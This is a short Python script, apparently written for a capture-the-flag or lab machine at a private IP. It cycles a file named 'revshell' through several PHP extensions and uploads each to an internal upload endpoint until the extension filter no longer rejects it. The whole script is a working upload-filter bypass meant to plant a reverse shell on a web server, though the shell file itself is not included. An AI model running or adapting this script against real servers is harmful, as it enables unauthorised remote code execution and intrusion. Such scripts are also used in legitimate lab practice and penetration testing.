import requests
import os

ip = "10.10.191.30"
url = f"http://{ip}:3333/internal/index.php"

filename = "revshell"
old_filename = "revshell.php"
ext = [
    ".php",
    ".php3",
    ".php4",
    ".php5",
    ".phtml"
]

files = {"file"}
for e in ext:
    new_filename = filename + e
    os.rename(old_filename, new_filename)

    files = {"file": open(new_filename, "rb")}

    r = requests.post(url, files = files)
    if not "Extension not allowed" in r.text:
        print(e)
        break;
    old_filename = new_filename

print(url)
